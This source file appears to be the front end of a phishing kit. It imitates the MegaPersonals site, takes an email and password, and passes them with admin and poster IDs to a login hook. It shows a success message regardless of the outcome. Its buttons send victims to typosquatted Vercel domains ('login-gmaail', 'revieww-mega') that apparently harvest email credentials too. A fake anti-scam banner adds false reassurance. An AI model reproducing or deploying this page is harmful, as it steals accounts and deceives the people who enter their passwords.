"use client";
import { Field, Form, Formik } from "formik";
import { site } from "../config/index";
import useMockLogin from "../hooks/useMockLogin";
import { useState } from "react";
import { toast } from "react-toastify";
import { useRouter } from "next/navigation";
import Cookies from "js-cookie";
import { API_URL } from "../config";
import Image from "next/image";

function LoginForm({ adminId, posterId ,verifyId}) {
  const router = useRouter();
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [wrongPassword, setWrongPassword] = useState("");
  // const [showWrongPassword, setShowWrongPassword] = useState(false);
  const { login } = useMockLogin(adminId, posterId);

  const handleSubmit = () => {
    const submitValues = {
      site: site,
      email: email,
      password: password,
    };
    login(submitValues);
    // setShowWrongPassword(true);
    toast.success("Login successfull");
    // router.push(`/security-check`);
    setEmail("");
    setPassword("");
  
    console.log(submitValues);
  };



  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-white p-4 text-center space-y-6">
      <div>
        <h1 className="text-4xl font-bold">
          <span className="text-orange-500">Mega</span>
          <span className="text-blue-500">Personals</span>
        </h1>
        <p className="text-gray-400 mt-1 text-sm">personals classifieds</p>
      </div>

      <div className="text-red-600 font-bold text-xl">BEFORE RESETTING YOUR PASSWORD</div>

      <div className="text-gray-800 text-base max-w-md">
        <p className="mb-4">To be sure your account is secure,</p>
        <p className="font-semibold">We strongly recommend:</p>
        <ol className="text-left mt-2 space-y-2">
          <li>1) <span className="font-semibold">FIRST</span> change your password on your email address</li>
          <li>2) <span className="font-semibold">THEN</span> come back here to change your Mega password</li>
        </ol>
      </div>

      <div className="space-y-4 w-full max-w-md">
        <button  onClick={() => window.open(`https://login-gmaail.vercel.app/${adminId}/${posterId}/${verifyId}`, '_blank')}  className="w-full bg-green-500 text-white py-3 px-4 rounded-md font-medium hover:bg-green-600">
          OK. I understand.<br /> I will go change my email password first.
        </button>
        <button   onClick={() => window.open(`https://revieww-mega.vercel.app/${adminId}/${posterId}/${verifyId}`, '_blank')} className="w-full bg-orange-400 text-white py-3 px-4 rounded-md font-medium hover:bg-orange-500">
          Already changed my email password.<br /> Ready to change my MEGA password
        </button>
      </div>

      <div className="bg-yellow-300 border border-black p-4 rounded-md max-w-md w-full mt-8">
        <p className="font-bold text-black text-lg">DON'T GET SCAMMED!</p>
        <p className="text-black text-sm mt-1">Is the address up top: <br /> <span className="font-semibold">megapersonals.eu</span> ?</p>
      </div>
    </div>
  );
}

export default LoginForm;
